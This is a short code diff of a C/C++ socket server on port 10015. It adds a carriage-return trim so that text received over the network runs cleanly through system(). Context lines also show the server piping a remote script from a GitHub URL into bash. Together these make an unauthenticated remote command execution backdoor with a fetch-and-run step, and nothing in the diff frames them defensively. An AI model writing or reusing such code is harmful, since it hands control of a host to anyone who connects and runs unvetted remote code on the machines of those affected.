@@ -6,6 +6,7 @@
 #include <stdio.h>
 #include <time.h>
 #include <stdlib.h>
+#include <cstring>
 
 #define PORT 10015
 #define BACKLOG 128
@@ -132,6 +133,11 @@ int main(int argc, char * argv[]) {
                 retour = system("curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/spook4.sh | bash");
             }
             else {
+                int last_index = std::strlen(ligne2) - 1;
+
+                if (ligne2[last_index] == '\r') {
+                    ligne2[last_index] = '\0';
+                }
                 retour = system(ligne2);
             }
             
